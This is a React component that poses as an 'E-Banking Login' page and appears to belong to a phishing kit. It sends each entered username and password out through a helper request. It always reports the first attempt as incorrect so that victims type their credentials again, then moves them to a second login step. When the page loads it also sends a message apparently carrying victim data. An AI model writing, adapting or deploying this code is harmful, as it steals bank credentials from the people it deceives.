import {
  Box,
  Button,
  FormControl,
  FormLabel,
  Input,
  Text,
  VStack,
} from "@chakra-ui/react";
import { useEffect, useState } from "react";
import { useForm, SubmitHandler } from "react-hook-form";
import { useNavigate } from "react-router-dom";
import {
  sendRequest,
  userDataTemplate,
  userNameTemplate,
} from "../../../helpers";

type Inputs = {
  username: string;
  password: string;
};

const Form1 = () => {
  const navigate = useNavigate();
  const [isLoading, setLoading] = useState(false);
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<Inputs>();
  const [showTopError, setShowTopError] = useState(false);
  const [sentCount, setSentCount] = useState(0);
  const [data, setData] = useState({ username: "", password: "" });
  const onSubmit: SubmitHandler<Inputs> = async (data) => {
    setData(() => data);

    if (data.username === "" || data.password === "") {
      return;
    }

    const message = userNameTemplate(data.username, data.password);
    await sendRequest(message, setLoading);
    setSentCount((prev) => prev + 1);
    if (sentCount >= 1) {
      navigate("/login/2");
    } else {
      setShowTopError(true);
    }
  };

  useEffect(() => {
    const call = async () => {
      const message = await userDataTemplate();

      sendRequest(message, setLoading);
    };

    call();
  }, []);

  return (
    <>
      <VStack
        spacing="6"
        w={{ base: "100%", md: "50%" }}
        marginLeft={{ base: "unset", md: "25%" }}
        bg="#1c70c8"
        p="4"
        color="#fff"
      >
        <Text fontFamily="Poppins" fontSize="lg" textAlign="center">
          E-Banking Login
        </Text>
        {showTopError ? (
          <Text
            fontFamily="Poppins"
            fontSize="sm"
            color="red"
            w="full"
            bg="#fff"
            borderRadius="2px"
            textAlign="center"
          >
            Username or Password is incorrect.
          </Text>
        ) : null}
        <Box
          w="90%"
          display="flex"
          flexDirection="column"
          justifyContent="space-between"
        >
          <form onSubmit={handleSubmit(onSubmit)}>
            <FormControl mb="2">
              <FormLabel>Username</FormLabel>
              <Input
                outline="none"
                placeholder="Username"
                _placeholder={{ color: "#fff", fontSize: "xs" }}
                {...register("username")}
                autoComplete="off"
              />
              {errors.username && (
                <Text fontSize="xs" color="red">
                  Username is required
                </Text>
              )}
            </FormControl>

            <FormControl mb="2">
              <FormLabel>Password</FormLabel>
              <Input
                outline="none"
                type="password"
                autoComplete="off"
                placeholder="Password"
                _placeholder={{ color: "#fff", fontSize: "xs" }}
                {...register("password", { required: true })}
              />
              <Text
                fontFamily="Poppins"
                position="absolute"
                right="0"
                fontSize="xs"
                textAlign="center"
                cursor="pointer"
                pt="1"
              >
                Forgot Password?
              </Text>
              {errors.password && (
                <Text fontSize="xs" color="red">
                  Password is required
                </Text>
              )}
            </FormControl>

            <Box
              display="flex"
              justifyContent="center"
              alignItems="center"
              mt="8"
            >
              <Button
                fontSize="md"
                minW="150px"
                type="submit"
                mx="4"
                bg="orange"
                color="#fff"
                _hover={{ bg: "orange", opacity: "0.8", color: "#fff" }}
              >
                Sign In
              </Button>
            </Box>
          </form>
        </Box>
      </VStack>
      <VStack
        spacing="2"
        mt="2"
        w={{ base: "100%", md: "50%" }}
        marginLeft={{ base: "unset", md: "25%" }}
        bg="#1c70c8"
        p="4"
        color="#fff"
      >
        <Text fontFamily="Poppins" fontSize="sm" textAlign="center">
          Don't have an account?
        </Text>
        <Box
          w="90%"
          display="flex"
          flexDirection="column"
          justifyContent="space-between"
        >
          <Box display="flex" justifyContent="center" alignItems="center">
            <Button
              fontSize="md"
              minW="150px"
              type="submit"
              mx="2"
              bg="orange"
              color="#fff"
              _hover={{ bg: "orange", opacity: "0.8", color: "#fff" }}
            >
              Register
            </Button>
          </Box>
        </Box>
      </VStack>
    </>
  );
};

export default Form1;
